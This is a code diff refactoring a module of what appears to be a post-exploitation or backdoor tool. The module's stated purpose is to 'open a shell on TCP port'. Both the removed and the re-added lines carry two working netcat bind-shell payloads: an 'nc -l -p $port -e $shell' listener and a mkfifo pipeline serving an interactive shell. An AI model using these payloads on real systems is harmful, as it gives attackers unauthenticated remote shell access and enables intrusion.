@@ -12,18 +12,20 @@ class Tcp(ModuleProbeAll):
     '''Open a shell on TCP port'''
 
 
-    vectors = VectorList([
-            Vector('shell.sh', 'netcat-traditional', """nc -l -p $port -e $shell"""),
-            Vector('shell.sh', 'netcat-bsd', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc -l $port >/tmp/f; rm -rf /tmp/f""")
-        ])
+        
+    def _init_vectors(self):
+
+        self.vectors = VectorList([
+                Vector('shell.sh', 'netcat-traditional', """nc -l -p $port -e $shell"""),
+                Vector('shell.sh', 'netcat-bsd', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc -l $port >/tmp/f; rm -rf /tmp/f""")
+            ])
 
 
-
-    argparser = ArgumentParser(usage=__doc__)
-    argparser.add_argument('port', help='Port to open', type=int)
-    argparser.add_argument('-shell', help='Shell', default='/bin/sh')
-    argparser.add_argument('-vector', choices = vectors.get_names())
-    argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')
+    def _init_args(self):
+        self.argparser.add_argument('port', help='Port to open', type=int)
+        self.argparser.add_argument('-shell', help='Shell', default='/bin/sh')
+        self.argparser.add_argument('-vector', choices = self.vectors.get_names())
+        self.argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')
 
     def _prepare_probe(self):
         self._result = ''
